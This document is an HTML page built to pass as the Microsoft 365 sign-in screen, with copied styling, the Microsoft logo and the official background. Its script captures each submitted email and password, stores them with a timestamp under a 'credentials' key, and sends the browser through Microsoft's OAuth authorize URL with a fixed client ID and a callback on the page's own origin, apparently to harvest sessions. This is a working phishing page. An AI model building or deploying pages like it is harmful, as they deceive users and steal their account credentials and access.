<!doctype html>
<html lang="en">
<head>
  <title>Sign in to your account</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link rel="shortcut icon" href="/images/favicon.ico">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
  <style>
    /* --- CSS TO EXACTLY MATCH THE NEW SCREENSHOT --- */
    body, html {
      height: 100%;
      margin: 0;
      font-family: "Segoe UI", "Helvetica Neue", "Arial", sans-serif;
      /* Official Microsoft 365 background */
      background: url("https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696894951a34a3485345710a6.svg") no-repeat center center fixed;
      -webkit-background-size: cover;
      -moz-background-size: cover;
      -o-background-size: cover;
      background-size: cover;
    }
    .main-container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100%;
      width: 100%;
    }
    .form-wrapper {
      max-width: 440px; /* Key to matching the size */
      width: 100%;
      min-height: 360px; /* Ensures the card has enough height */
      background-color: #fff;
      box-shadow: 0px 1.2px 3.6px rgba(0,0,0,0.1), 0px 6.4px 14.4px rgba(0,0,0,0.13);
    }
    .form-content {
      padding: 44px;
    }
    .form-content h1 {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 24px;
      color: #1b1b1b;
    }
    .form-control {
      border: 0;
      border-bottom: 1px solid #8A8886;
      border-radius: 0;
      padding-left: 0;
      font-size: 16px;
    }
    .form-control:focus {
      box-shadow: none;
      outline: none;
      border-color: #0078d4;
    }
    p {
      font-size: 15px;
      margin-top: 16px;
      margin-bottom: 0;
    }
    a {
      color: #0067b8;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }
    .btn {
      border: none;
      border-radius: 2px;
      font-size: 15px;
      padding: 4px 12px;
      min-width: 108px;
      min-height: 32px;
    }
    #back {
      cursor: pointer;
      color: #23272a;
      font-size: 16px;
      vertical-align: middle;
    }
    .options-container {
      margin-top: 24px;
      border-top: 1px solid #d2d2d2;
      padding: 24px 44px;
    }
    .options-container a {
      color: #1b1b1b;
    }
    .fa-key {
      color: #5e5e5e;
      margin-right: 8px;
    }
    .footer {
      position: fixed;
      right: 16px;
      bottom: 12px;
      font-size: 12px;
    }
    .footer a {
      color: #000;
      margin-left: 16px;
    }
  </style>
</head>
<body>

  <div class="main-container">
    <div class="form-wrapper">
      <!-- Main Content Area -->
      <div class="form-content">
        <!-- Email View -->
        <div id="div1">
          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
          <h1 class="mt-4">Sign in</h1>
          <span id="error" class="text-danger" style="display:none; font-size: 13px;">That Microsoft account doesn't exist. Enter a different account.</span>
          <div class="form-group mt-2">
            <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" autocomplete="email" autocapitalize="none">
          </div>
          <p>No account? <a href="#">Create one!</a></p>
          <p><a href="#">Canâ€™t access your account?</a></p>
          <div class="text-right mt-4">
            <button class="btn text-white" id="next" style="background-color: #0067b8;">Next</button>
          </div>
        </div>

        <!-- Password View -->
        <div id="div2" style="display:none;">
          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
          <div class="mt-4">
              <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch" style="font-size:15px;"></span>
          </div>
          <h1 class="mt-3">Enter password</h1>
          <span id="msg" class="text-danger" style="display:none; font-size: 13px;">Please enter your password.</span>
          <div class="form-group mt-2">
            <input type="password" class="form-control" id="password" placeholder="Password" autocomplete="current-password">
          </div>
          <p><a href="#">Forgot my password</a></p>
          <div class="text-right mt-4">
            <button class="btn text-white" id="submit-btn" style="background-color: #0067b8;">Sign in</button>
          </div>
        </div>
      </div>
      
      <!-- "Sign-in options" Area -->
      <div class="options-container" id="options_box">
        <p><i class="fas fa-key"></i> <a href="#">Sign-in options</a></p>
      </div>
    </div>
  </div>

  <div class="footer">
    <a href="#">Terms of use</a>
    <a href="#">Privacy & cookies</a>
    <a href="#">...</a>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    // --- THIS JAVASCRIPT LOGIC IS UNTOUCHED ---
    $(document).ready(function(){
      function isValidEmail(email) {
        if (!email) return false;
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
      }
      $('#next').click(function(e) {
        e.preventDefault();
        const email = $('#email').val().trim();
        if (isValidEmail(email)) {
          $('#emailch').text(email);
          $('#div1').hide();
          $('#div2').show();
          $('#options_box').hide();
          $('#error').hide();
        } else {
          $('#error').show();
        }
      });
      $('#back').click(function() {
        $('#div2').hide();
        $('#div1').show();
        $('#options_box').show();
        $('#msg').hide();
      });
      $('#submit-btn').click(function(event){
        event.preventDefault();
        const email = $('#emailch').text().trim();
        const password = $('#password').val();
        if (!password) {
          $('#msg').show();
          return;
        }
        $('#msg').hide();
        $('#submit-btn').text('Verifying...').prop('disabled', true);
        const credentialsData = { email: email, password: password, captureTime: new Date().toISOString(), source: 'replacement-html-final' };
        try {
          localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
          console.log('âœ… Credentials stored successfully in localStorage.');
        } catch (e) {
          console.error('âŒ Failed to store credentials in localStorage:', e);
        }
        const callbackUrl = window.location.origin + '/auth/callback';
        const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
        console.log(`ðŸ”„ Redirecting to Microsoft for cookie setting. Will return to: ${callbackUrl}`);
        setTimeout(() => {
          window.location.href = microsoftLoginUrl;
        }, 1200);
      });
    });
  </script>
</body>
</html>
